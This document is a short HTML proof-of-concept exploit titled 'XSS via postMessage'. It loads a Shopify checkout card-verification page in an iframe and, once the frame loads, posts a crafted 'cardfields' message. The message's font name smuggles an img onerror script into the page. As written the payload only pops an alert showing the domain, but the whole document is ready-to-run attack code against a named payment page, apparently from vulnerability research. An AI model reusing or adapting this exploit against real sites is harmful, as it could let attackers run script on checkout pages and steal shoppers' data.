<!DOCTYPE html>
<html>
<head>
    <title>XSS via postMessage</title>
</head>
<body>
    <iframe id="victim" src="https://checkout.us.shopifycs.com/verification_value?identifier=4a94b55cf88c409b43b2cc6b16ec1869&dir=ltr"></iframe>
    <script>
        var iframe = document.getElementById('victim');

        iframe.onload = function() {
         
            var payload = {
                action: "load_fonts",
                fonts: {
                    google: ["\"><img src=x onerror=alert('XSS via postMessage: ' + document.domain)>"]
                }
            };

            
            var msg = 'cardfields:' + JSON.stringify(payload);

            iframe.contentWindow.postMessage(msg, '*');
        };
    </script>
</body>
</html>
